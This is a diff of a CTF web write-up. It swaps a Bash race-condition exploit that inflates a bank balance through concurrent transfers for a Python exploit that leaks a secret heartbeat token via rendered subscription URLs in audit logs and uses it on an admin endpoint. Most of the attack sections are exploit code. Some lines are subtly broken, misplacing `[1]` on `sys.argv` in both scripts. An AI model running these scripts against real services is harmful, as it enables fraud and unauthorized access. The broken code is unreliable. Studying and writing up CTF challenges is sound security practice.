@@ -1,361 +1,406 @@
-# Challenge - Withdraw Under Pressure 
+# Challenge - Crosstalk 
 
 - Category: Web  
 - Difficulty: Hard  
 
-This challenge revolves around **Meridian Trust Bank**, a Flask‑based online banking app where each new account gets a \$100 welcome bonus, and “Premium Account Access” in the store costs \$500. The goal is to abuse a **race condition in the transfer logic** to boost a single account’s balance to at least \$500, buy premium access, and extract the flag. My solution automates the exploit entirely in Bash.
+Crosstalk is a hard web challenge built around a Flask‑based webhook relay service called **HookRelay**. Users can register, authenticate with JWTs, create subscriptions with URL templates, and inspect audit logs of dispatched events. A privileged **control‑plane** endpoint at `/api/v2/admin/control` requires a secret `HEARTBEAT_TOKEN` passed via `X-Heartbeat-Token`. The trick is that a background `system.heartbeat` event leaks this token into user‑visible audit logs because of a faulty broadcast implementation, and we can exfiltrate it using a crafted subscription and a short Python script.
 
 ---
 
-## 1. Challenge Overview
+## 1. High‑Level Idea
 
-The web app exposes typical banking features:
-
-- User registration and login.
-- Balance check via `/balance` (JSON).
-- Money transfers via `/transfer`.
-- A store at `/store` with a premium item:
-  - `premium_access` costs \$500.
-- Purchasing via `/store/buy`:
-  - On success (balance ≥ 500), returns a JSON payload that includes the flag.
-
-Important application behaviors:
-
-- Each new account starts with a **\$100 welcome bonus**.
-- Transfers are done via `POST /transfer` with `to_user` and `amount`.
-- Self‑transfers (to your own username) are blocked, but you can transfer freely between different users.
-- There is **no rate limiting**, and the transfer logic is not protected by transactions or locks, creating a TOCTOU race window.
+- The app has a background heartbeat loop that emits `system.heartbeat` events every 60 seconds.
+- The heartbeat event carries a secret `HEARTBEAT_TOKEN` in `actor.context.continuation_id`.
+- Normal subscriptions are filtered by event type (e.g. `user.created`, `webhook.delivered`) and **cannot** subscribe directly to `system.*` events.
+- However, the audit broadcast function **renders all subscriptions’ URL templates** against the heartbeat event, ignoring their filters.
+- The rendered URL for that heartbeat is stored in the audit log as `rendered_url` and is visible to the user via `/api/v2/audit/dispatches`.
+- If our URL template references `{{actor.context.continuation_id}}`, the heartbeat will render a URL containing the `HEARTBEAT_TOKEN`.
+- We read the audit log, extract the token, and call `/api/v2/admin/control` with `X-Heartbeat-Token: <token>` to get the flag.
 
 ---
 
-## 2. Root Cause: TOCTOU Race on Transfers
+## 2. Application Overview
 
-Server‑side transfer logic is conceptually:
+Core components (in the provided source):
+
+- **Auth** (`/api/auth/register`):
+  - Register a user with a username.
+  - Returns a JWT and a `user_id`.
+  - Subsequent API calls use `Authorization: Bearer <token>`.
+
+- **Subscriptions** (`/api/v2/subscriptions`):
+  - Authenticated users can create subscriptions with:
+    - `name`
+    - `url_template` (templated string)
+    - `filter` (event type filter, e.g. `user.created`)
+  - `ALLOWED_FILTERS` excludes `system.*` to prevent direct subscription to heartbeat events.
+
+- **Dispatch / Audit**:
+  - Normal events go through `dispatch_event`, which:
+    - Filters subscriptions based on `filter`.
+    - Renders their `url_template` with the event data.
+    - Records dispatch info and `rendered_url` in the audit log.
+  - Heartbeat events go through `record_system_broadcast`, which:
+    - Iterates **all** subscriptions.
+    - Renders each `url_template` with the heartbeat event, **ignoring filter**.
+    - Records a `system.heartbeat` audit entry per subscription.
+
+- **Heartbeat Loop**:
+  - Every ~60 seconds, emits a `system.heartbeat` event like:
+
+    ```json
+    {
+      "type": "system.heartbeat",
+      "actor": {
+        "context": {
+          "continuation_id": "<HEARTBEAT_TOKEN>"
+        }
+      }
+    }
+    ```
+
+- **Control Plane** (`/api/v2/admin/control`):
+  - Protected by a header: `X-Heartbeat-Token`.
+  - Only returns the flag if the header matches the secret `HEARTBEAT_TOKEN` generated at startup.
+
+There are other interesting bugs (JWT alg confusion, GraphQL PIN brute‑force, SQLi in legacy search), but the intended path is through the heartbeat token leak.
+
+---
+
+## 3. Vulnerability: Filter Bypass in Heartbeat Broadcast
+
+Normal dispatch path (simplified):
 
 ```python
-@app.route('/transfer', methods=['POST'])
-def transfer():
-    to_user = request.form['to_user']
-    amount = float(request.form['amount'])
-
-    sender = current_user()
-    recipient = get_user_by_username(to_user)
-
-    # TIME OF CHECK
-    if sender.balance < amount:
-        return jsonify({"error": "Insufficient funds"}), 400
-
-    # --- RACE WINDOW ---
-    # Multiple concurrent requests can all pass this check
-    # before any balance deduction is committed.
-
-    # TIME OF USE
-    sender.balance -= amount
-    recipient.balance += amount
-    save(sender)
-    save(recipient)
-
-    return jsonify({"status": "success", "amount": amount, "to": to_user})
+def dispatch_event(event):
+    subs = [s for s in subscriptions if filter_matches(s.filter, event["type"])]
+    for sub in subs:
+        rendered = render_template(sub.url_template, event)
+        record_dispatch(sub, event, rendered)
 ```
 
-Because the check (`sender.balance < amount`) and the update (deduct/credit) are not atomic:
+Heartbeat broadcast path:
 
-- Several concurrent requests can all **see the same initial balance** (e.g. \$100).
-- They all pass the check.
-- One or more may succeed in deducting and transferring funds that shouldn’t be available.
-- In practice, at least one transfer beyond the “correct” balance gets through, especially under load.
+```python
+def record_system_broadcast(event):
+    for sub in get_all_subscriptions():
+        rendered = render_template(sub.url_template, event)
+        record_dispatch(sub, event, rendered)
+```
 
-Combined with the \$100 welcome bonus per account, we can create multiple accounts, race transfers into a chosen “destination” account, and then use that boosted balance to buy premium access.
+Key differences:
+
+- `dispatch_event` filters subscriptions by event type (`filter_matches`).
+- `record_system_broadcast` **does not** filter; it blindly renders every subscription’s template against the heartbeat event.
+
+Consequences:
+
+- Even though users cannot configure filters like `system.heartbeat`, their subscriptions still get rendered during the heartbeat.
+- If the subscription’s template references fields inside the heartbeat payload (such as `actor.context.continuation_id`), those values appear in `rendered_url`.
+- The audit log entry for `system.heartbeat` is visible via `/api/v2/audit/dispatches`, so any user can read their subscription’s `rendered_url` and thus see the secret token.
+
+This is a classic case of **side‑channel leakage through audit logging** plus a **filter bypass**.
 
 ---
 
-## 3. My Exploit Script (Bash)
+## 4. My Exploit Script
 
-Here is the Bash script I used to reliably exploit the race and extract the flag:
+To automate the exploit, I used this Python script:
 
-```bash
-#!/usr/bin/env bash
-set -uo pipefail
-
-BASE="TU HOST"
-PASS="Passw0rd123!"
-
-RUN_ID="$(date +%s)_$RANDOM"
-DST="dst_$RUN_ID"
-DST_COOKIE="c_dst_$RUN_ID.txt"
-
-rm -f c_src_*.txt /tmp/mtb_race_*.out buy.json buy2.json store_after.html dashboard_after.html
-
-echo "[+] Meridian Trust Bank exploit final"
-echo "[+] BASE: $BASE"
-echo "[+] Cuenta destino: $DST"
-echo "[+] Cookie destino: $DST_COOKIE"
-
-echo
-echo "[+] Creando cuenta destino..."
-curl -sk -c "$DST_COOKIE" -b "$DST_COOKIE" \
-  -X POST "$BASE/register" \
-  -d "username=$DST&password=$PASS" >/dev/null
-
-get_balance() {
-  curl -sk -b "$DST_COOKIE" "$BASE/balance" | python3 -c '
-import sys, json
-try:
-    data = json.load(sys.stdin)
-    print(float(data.get("balance", 0)))
-except Exception:
-    print(0.0)
-'
-}
-
-balance_ok() {
-  python3 - "$1" <<'PY'
+```python
+#!/usr/bin/env python3
+import re
 import sys
-balance = float(sys.argv)[1]
-sys.exit(0 if balance >= 500 else 1)
-PY
+import time
+import secrets
+import requests
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+HOST = sys.argv.rstrip("/") if len(sys.argv) > 1 else "https://09292adac643a29d.chal.ctf.ae"[1]
+
+s = requests.Session()
+s.verify = False
+
+print(f"[+] Target: {HOST}")
+
+# 1. Register normal user
+username = "brau_" + secrets.token_hex(4)
+r = s.post(
+    f"{HOST}/api/auth/register",
+    json={"username": username},
+    timeout=15,
+)
+
+print("[+] Register:", r.status_code)
+if r.status_code != 200:
+    print(r.text)
+    sys.exit(1)
+
+data = r.json()
+token = data["token"]
+user_id = data["user_id"]
+
+print(f"[+] Username: {username}")
+print(f"[+] User ID: {user_id}")
+
+headers = {
+    "Authorization": f"Bearer {token}",
 }
 
-extract_flag() {
-  grep -Eoi 'after\{[^}]+\}|ctf\{[^}]+\}|flag\{[^}]+\}|[A-Za-z0-9_]+\{[^}]+\}' "$@" 2>/dev/null | sort -u || true
-}
+# 2. Create subscription that leaks heartbeat continuation_id into rendered_url
+template = "https://relay.example/{{actor.context.continuation_id}}/{{type}}/{{region}}"
 
-BAL="$(get_balance)"
-echo "[+] Balance inicial destino: $BAL"
+r = s.post(
+    f"{HOST}/api/v2/subscriptions",
+    headers=headers,
+    json={
+        "name": "heartbeat-leak",
+        "url_template": template,
+        "filter": "user.created"
+    },
+    timeout=15,
+)
 
-ROUND=1
+print("[+] Create subscription:", r.status_code)
+print(r.text)
 
-while true; do
-  BAL="$(get_balance)"
+if r.status_code not in (200, 201):
+    sys.exit(1)
 
-  if balance_ok "$BAL"; then
-    echo "[+] Balance suficiente: $BAL"
-    break
-  fi
+# 3. Poll audit log until system heartbeat appears
+heartbeat_token = None
 
-  SRC="src_${RUN_ID}_${ROUND}_$RANDOM"
-  SRC_COOKIE="c_src_${RUN_ID}_${ROUND}.txt"
+print("[+] Waiting for system heartbeat in audit log...")
 
-  echo
-  echo "[+] Round $ROUND"
-  echo "[+] Creando cuenta origen: $SRC"
+for i in range(90):
+    r = s.get(
+        f"{HOST}/api/v2/audit/dispatches",
+        headers=headers,
+        timeout=15,
+    )
 
-  curl -sk -c "$SRC_COOKIE" -b "$SRC_COOKIE" \
-    -X POST "$BASE/register" \
-    -d "username=$SRC&password=$PASS" >/dev/null
+    if r.status_code != 200:
+        print("[-] Audit error:", r.status_code, r.text)
+        sys.exit(1)
 
-  echo "[+] Balance destino antes del race: $(get_balance)"
-  echo "[+] Lanzando race hacia $DST usando to_user..."
+    logs = r.json()
 
-  for i in $(seq 1 25); do
-    curl -sk -b "$SRC_COOKIE" \
-      -X POST "$BASE/transfer" \
-      -d "to_user=$DST&amount=100" > "/tmp/mtb_race_${ROUND}_${i}.out" &
-  done
+    for entry in logs:
+        if entry.get("event_type") == "system.heartbeat":
+            rendered = entry.get("rendered_url", "")
+            print("[+] Heartbeat audit row found:")
+            print(rendered)
 
-  wait
+            m = re.search(r"https://relay\.example/([0-9a-f]{48})/", rendered)
+            if m:
+                heartbeat_token = m.group(1)
+                break
 
-  SUCCESS_COUNT="$(grep -h '"status":"success"' /tmp/mtb_race_${ROUND}_*.out 2>/dev/null | wc -l)"
-  BAL="$(get_balance)"
+    if heartbeat_token:
+        break
 
-  echo "[+] Transfers exitosos en este round: $SUCCESS_COUNT"
-  echo "[+] Balance destino ahora: $BAL"
+    if i % 5 == 0:
+        print(f"[+] Still polling... logs={len(logs)}")
 
-  ROUND=$((ROUND + 1))
+    time.sleep(1)
 
-  if [[ "$ROUND" -gt 8 ]]; then
-    echo "[!] No se llego a 500. Ultimo balance: $BAL"
-    echo "[!] Respuestas del ultimo race:"
-    cat /tmp/mtb_race_*_*.out 2>/dev/null | sort -u
-    exit 1
-  fi
-done
+if not heartbeat_token:
+    print("[-] No heartbeat token found. Run again or wait a bit more.")
+    sys.exit(1)
 
-echo
-echo "[+] Comprando Premium Account Access..."
-curl -sk -b "$DST_COOKIE" \
-  -X POST "$BASE/store/buy" \
-  -d 'item=premium_access' | tee buy.json
+print(f"[+] HEARTBEAT_TOKEN: {heartbeat_token}")
 
-echo
-echo "[+] Intentando revelar certificado..."
-curl -sk -b "$DST_COOKIE" \
-  -X POST "$BASE/store/buy" \
-  -d 'item=premium_access' | tee buy2.json
+# 4. Use leaked token on control-plane endpoint
+r = s.get(
+    f"{HOST}/api/v2/admin/control",
+    headers={"X-Heartbeat-Token": heartbeat_token},
+    timeout=15,
+)
 
-echo
-echo "[+] Descargando paginas finales..."
-curl -sk -b "$DST_COOKIE" "$BASE/store" -o store_after.html
-curl -sk -b "$DST_COOKIE" "$BASE/dashboard" -o dashboard_after.html
-
-echo
-echo "[+] Balance final:"
-curl -sk -b "$DST_COOKIE" "$BASE/balance"
-echo
-
-echo
-echo "[+] Buscando flag..."
-FLAG="$(extract_flag buy.json buy2.json store_after.html dashboard_after.html)"
-
-if [[ -n "$FLAG" ]]; then
-  echo
-  echo "[+] FLAG ENCONTRADA:"
-  echo "$FLAG"
-else
-  echo
-  echo "[!] No encontre flag con regex. Mostrando respuestas:"
-  echo
-  echo "===== buy.json ====="
-  cat buy.json
-  echo
-  echo "===== buy2.json ====="
-  cat buy2.json
-  echo
-  echo "===== store grep ====="
-  grep -nEi 'certificate|certificat|flag|after|ctf|premium|success|error|purchased' store_after.html || true
-fi
-
-echo
-echo "[+] Datos usados:"
-echo "    DST=$DST"
-echo "    DST_COOKIE=$DST_COOKIE"
-echo "    BALANCE=$(get_balance)"
+print("[+] Control plane response:")
+print(r.status_code)
+print(r.text)
 ```
 
-Replace `BASE="TU HOST"` with the actual challenge URL before running.
+Let’s break down what it does.
 
 ---
 
-## 4. Exploit Logic in Detail
+## 5. Exploit Flow Step‑by‑Step
 
-### 4.1 Destination Account Creation
+### Step 1: Register User and Obtain JWT
 
-We first create a **destination account** where we want to accumulate money:
+We register a random user to get a valid JWT for authenticated API calls:
 
-- Random username: `dst_<timestamp>_<random>`.
-- Fixed password: `Passw0rd123!`.
-- Cookies stored in `DST_COOKIE`.
-
-This account starts at \$100 (welcome bonus).
-
-```bash
-curl -sk -c "$DST_COOKIE" -b "$DST_COOKIE" \
-  -X POST "$BASE/register" \
-  -d "username=$DST&password=$PASS"
+```python
+username = "brau_" + secrets.token_hex(4)
+r = s.post(
+    f"{HOST}/api/auth/register",
+    json={"username": username},
+    timeout=15,
+)
+data = r.json()
+token = data["token"]
+user_id = data["user_id"]
+headers = {"Authorization": f"Bearer {token}"}
 ```
 
-`get_balance` is a helper that queries `/balance` and parses the JSON with Python, returning a floating‑point value.
+The response includes:
 
-### 4.2 Race Rounds: Pumping the Destination Balance
+- `token`: JWT to be used in `Authorization: Bearer ...`.
+- `user_id`: internal identifier (not strictly required for the exploit).
 
-We loop until the destination balance is at least \$500, or up to 8 rounds:
+### Step 2: Create a Malicious Subscription
 
-1. Check current destination balance.
-2. If `< 500`, create a **source account** for this round:
-   - Username: `src_<RUN_ID>_<ROUND>_<random>`.
-   - It gets \$100 welcome bonus.
-3. From the source account, fire **25 concurrent transfer requests**:
+We create a subscription with a URL template that **intentionally references the heartbeat token field**:
 
-   ```bash
-   for i in $(seq 1 25); do
-     curl -sk -b "$SRC_COOKIE" \
-       -X POST "$BASE/transfer" \
-       -d "to_user=$DST&amount=100" > "/tmp/mtb_race_${ROUND}_${i}.out" &
-   done
+```python
+template = "https://relay.example/{{actor.context.continuation_id}}/{{type}}/{{region}}"
 
-   wait
-   ```
+r = s.post(
+    f"{HOST}/api/v2/subscriptions",
+    headers=headers,
+    json={
+        "name": "heartbeat-leak",
+        "url_template": template,
+        "filter": "user.created"
+    },
+    timeout=15,
+)
+```
 
-   - Each request tries to send \$100 to the destination.
-   - The source only has \$100, but due to the race condition, multiple transfers may be treated as valid.
-   - Even if only a few “status":"success" responses occur, that is enough to raise the destination balance well above the intended limit.
+Notes:
 
-4. After the race:
+- `filter` is set to `user.created` — a legitimate filter in `ALLOWED_FILTERS`.
+- Because of the bug in `record_system_broadcast`, this subscription will still be rendered for `system.heartbeat` events.
+- When the heartbeat fires, the URL template renders as:
 
-   - Count successful transfers via `grep '"status":"success"'`.
-   - Recheck destination balance via `get_balance`.
-   - If still `< 500`, start another round with a new source account.
+  ```text
+  https://relay.example/<HEARTBEAT_TOKEN>/<type>/<region>
+  ```
 
-The design ensures:
+  and is logged as `rendered_url` in the audit log.
 
-- Each round “injects” at least \$100 into the destination (under ideal race conditions, more).
-- Multiple rounds compound until the destination has ≥ \$500.
+### Step 3: Poll Audit Log and Extract HEARTBEAT_TOKEN
 
-### 4.3 Buying Premium and Extracting the Flag
+We poll `/api/v2/audit/dispatches` with our JWT until we see a `system.heartbeat` entry:
 
-Once `balance_ok` confirms the destination balance is ≥ 500, we:
+```python
+heartbeat_token = None
 
-1. Buy premium access:
+for i in range(90):
+    r = s.get(
+        f"{HOST}/api/v2/audit/dispatches",
+        headers=headers,
+        timeout=15,
+    )
+    logs = r.json()
 
-   ```bash
-   curl -sk -b "$DST_COOKIE" \
-     -X POST "$BASE/store/buy" \
-     -d 'item=premium_access' | tee buy.json
-   ```
+    for entry in logs:
+        if entry.get("event_type") == "system.heartbeat":
+            rendered = entry.get("rendered_url", "")
+            m = re.search(r"https://relay\.example/([0-9a-f]{48})/", rendered)
+            if m:
+                heartbeat_token = m.group(1)
+                break
 
-2. Send a second identical request, sometimes needed to reveal a “certificate” or final state:
+    if heartbeat_token:
+        break
 
-   ```bash
-   curl -sk -b "$DST_COOKIE" \
-     -X POST "$BASE/store/buy" \
-     -d 'item=premium_access' | tee buy2.json
-   ```
+    time.sleep(1)
+```
 
-3. Download final pages:
+Details:
 
-   ```bash
-   curl -sk -b "$DST_COOKIE" "$BASE/store" -o store_after.html
-   curl -sk -b "$DST_COOKIE" "$BASE/dashboard" -o dashboard_after.html
-   ```
+- We allow up to ~90 seconds to cover at least one heartbeat cycle.
+- For each `system.heartbeat` entry, we inspect `rendered_url`.
+- The regex `([0-9a-f]{48})` matches the 24‑byte hex token (`secrets.token_hex(24)` → 48 hex chars).
+- Once matched, we store it as `heartbeat_token`.
 
-4. Search all collected responses for a flag‑shaped pattern:
+If no token is found within the timeout, we bail out and recommend retrying — in practice, a heartbeat shows up within 60–70 seconds.
 
-   ```bash
-   FLAG="$(extract_flag buy.json buy2.json store_after.html dashboard_after.html)"
-   ```
+### Step 4: Call Admin Control Plane with Token
 
-`extract_flag` uses a regex that matches common flag formats:
+Finally, we hit the control plane endpoint using the leaked token:
 
-- `after{...}`, `ctf{...}`, `flag{...}`, or `<WORD>{...}` with alphanumerics/underscore.
+```python
+r = s.get(
+    f"{HOST}/api/v2/admin/control",
+    headers={"X-Heartbeat-Token": heartbeat_token},
+    timeout=15,
+)
+print(r.status_code)
+print(r.text)
+```
 
-If found, it prints the flag; if not, it dumps the JSON and HTML snippets for manual inspection.
+The server checks:
+
+- If `X-Heartbeat-Token` equals the internal `HEARTBEAT_TOKEN`.
+- On success, it returns a JSON object containing the flag.
+
+This completes the attack chain:
+
+1. User registration → JWT.
+2. Create subscription with template pointing to `actor.context.continuation_id`.
+3. Wait for heartbeat → token rendered into audit log.
+4. Extract token from `rendered_url`.
+5. Use token to access `/api/v2/admin/control`.
 
 ---
 
-## 5. Why the Exploit Works
+## 6. Why Other Vulnerabilities Are Red Herrings
 
-Key properties that make this exploitable:
+The challenge includes several additional issues:
 
-- **Non‑atomic transfer logic**: The balance check and update are not in a single transaction, allowing multiple concurrent calls to slip through.
-- **No per‑user rate limiting**: We can flood `/transfer` quickly with many parallel requests.
-- **Welcome bonus per account**: Every new account adds \$100 of “capital” to the system, which we can direct to the destination via race‑amplified transfers.
-- **Simple username‑based routing**: Transfers use `to_user` and rely on the currently logged‑in session for the sender, which we control via per‑account cookies.
+- **JWT algorithm confusion** (RS256 vs HS256).
+- **GraphQL PIN brute‑force** via query batching.
+- **SQL injection** in a legacy search endpoint.
 
-In practice, this leads to the destination account’s balance being inflated beyond what the banking logic intends, letting us cross the \$500 threshold and buy premium access.
+These can lead to elevated roles or access to legacy flag endpoints, but they:
 
----
+- Complicate the exploit.
+- Are not necessary once you understand the heartbeat broadcast bug.
+- Serve as distractions from the intended “crosstalk” between event systems and audit logging.
 
-## 6. Mitigation Ideas
-
-To fix such a vulnerability, a real banking system should:
-
-- Wrap balance checks and updates in **database transactions with row locks** (`SELECT ... FOR UPDATE`), or equivalent ORM transactional semantics.
-- Use **application‑level mutexes** per account if DB‑level locking is not available.
-- Implement **optimistic concurrency control** (version field / CAS) to detect concurrent updates.
-- Introduce **rate limiting** on financial endpoints like `/transfer`.
-- Add **server‑side validation** on `amount` and other parameters and robust logging for auditing.
+The clean, intended path is to leverage the **audit broadcast filter bypass** to leak the `HEARTBEAT_TOKEN`.
 
 ---
 
-## 7. Summary of Exploit Flow
+## 7. Lessons and Mitigation
 
-1. Create a destination account with \$100.
-2. In repeated rounds:
-   - Create a fresh source account with \$100.
-   - Fire 25 concurrent transfers of \$100 from source to destination.
-   - Let the race condition boost the destination balance.
-3. Stop once the destination has ≥ \$500.
-4. Use the destination account to `POST /store/buy` with `item=premium_access`.
-5. Parse responses and pages to locate the flag with a regex.
+Key lessons:
 
-All of this is automated in the Bash script above, making **Withdraw Under Pressure** a neat showcase of how race conditions in financial operations can be exploited to break business logic guarantees.
+- **Audit logs can leak secrets**: Logging fully rendered URLs for system events into user‑visible audit streams is dangerous.
+- **Filter enforcement must be consistent**: If normal dispatch enforces filters, special‑case broadcast functions must do so as well.
+- **Secrets should not live in generic event payloads**: Sensitive tokens like `HEARTBEAT_TOKEN` should be kept out of data structures that can flow into user‑visible templates.
+
+Mitigations:
+
+1. Make `record_system_broadcast` respect filters:
+
+   ```python
+   def record_system_broadcast(event):
+       for sub in get_all_subscriptions():
+           if not filter_matches(sub.filter, event["type"]):
+               continue
+           rendered = render_template(sub.url_template, event)
+           record_dispatch(sub, event, rendered)
+   ```
+
+   Combined with `system.*` not being in `ALLOWED_FILTERS`, no user subscriptions would ever see the heartbeat.
+
+2. Redact or omit `rendered_url` for system events in audit data visible to regular users.
+
+3. Avoid placing `HEARTBEAT_TOKEN` inside the generic event data passed through user‑templated rendering; use a separate secure channel or server‑side state.
+
+---
+
+## 8. Summary
+
+- Crosstalk’s core bug is a **filter bypass in the heartbeat audit broadcast**.
+- We create a subscription whose template references `{{actor.context.continuation_id}}`.
+- The heartbeat loop renders that template and logs a URL containing the secret `HEARTBEAT_TOKEN`.
+- We read the audit log, extract the token from `rendered_url`, and use it in `X-Heartbeat-Token` to access `/api/v2/admin/control`.
+- The provided Python script automates registration, subscription creation, heartbeat polling, token extraction, and control‑plane access, making this a concise, reliable exploit path for a hard web challenge.
